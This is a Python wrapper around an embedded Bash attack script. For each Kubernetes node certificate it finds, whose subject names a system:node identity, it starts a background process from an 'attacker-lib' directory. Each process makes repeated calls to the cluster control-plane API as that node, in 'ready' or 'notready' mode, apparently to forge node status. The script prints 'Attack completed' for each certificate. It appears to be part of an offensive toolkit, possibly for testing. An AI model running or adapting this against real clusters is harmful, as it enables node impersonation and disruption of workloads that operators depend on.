#!/usr/bin/env python3
"""Python entrypoint for state-update.sh."""

from __future__ import annotations

import os
import stat
import subprocess
import sys
import tempfile
from pathlib import Path

_SCRIPT = r"""#!/usr/bin/env bash
set -euo pipefail

API_SERVER="https://$CONTROL_PLANE_NODE:$CONTROL_PLANE_PORT"
MODE="${MODE:-ready}"                    # ready | notready
BASE="$DATA_PATH/KC5"
LOG_DIR="$BASE/logs"
PID_LIST="$BASE/pids"

mkdir -p "$LOG_DIR"

node_from_pem() {
  openssl x509 -in "$1" -noout -subject 2>/dev/null \
    | sed -n 's/^subject=.*CN *= *system:node:\([^,/]*\).*/\1/p' | head -n1
}

for pem in "$BASE"/cert_node/*.pem; do
  [[ -f "$pem" ]] || continue
  NODE="$(node_from_pem "$pem")"
  if [[ -z "$NODE" ]]; then
    echo "SKIP $pem (CN is not system:node:*)" >&2
    continue
  fi

  LOG_FILE="$LOG_DIR/$NODE.log"
  echo "Run updater for $NODE with $pem (MODE=$MODE)"
  setsid env \
    API_SERVER="$API_SERVER" \
    CERT_PATH="$pem" \
    MODE="$MODE" \
    python3 ${ATTACKER_LIB_DIR:-/opt/attacker-lib}/common/api-loop.py \
      >"$LOG_FILE" 2>&1 < /dev/null &

  pid=$!
  echo "$pid" | tee -a "$PID_LIST"
  echo "Attack completed for $pem"
done

echo "PIDs in $PID_LIST"
echo "Log for each node in $LOG_DIR/*.log"
"""


def _run_embedded_bash(script: str, argv: list[str]) -> int:
    """Run the embedded legacy payload through Bash with a Python-owned entrypoint."""
    try:
        current = Path(__file__).resolve()
        for parent in current.parents:
            lib_dir = parent / "lib"
            if (lib_dir / "common" / "shell.py").is_file():
                sys.path.insert(0, str(lib_dir))
                break
        from common.shell import run_embedded_bash
        return run_embedded_bash(script, argv)
    except Exception:
        with tempfile.NamedTemporaryFile("w", encoding="utf-8", suffix=".sh", delete=False) as handle:
            handle.write(script)
            path = handle.name
        try:
            Path(path).chmod(Path(path).stat().st_mode | stat.S_IXUSR)
            completed = subprocess.run(["/usr/bin/env", "bash", path, *argv], text=True)
            return int(completed.returncode)
        finally:
            try:
                os.unlink(path)
            except FileNotFoundError:
                pass


def main() -> None:
    raise SystemExit(_run_embedded_bash(_SCRIPT, sys.argv[1:]))


if __name__ == "__main__":
    main()
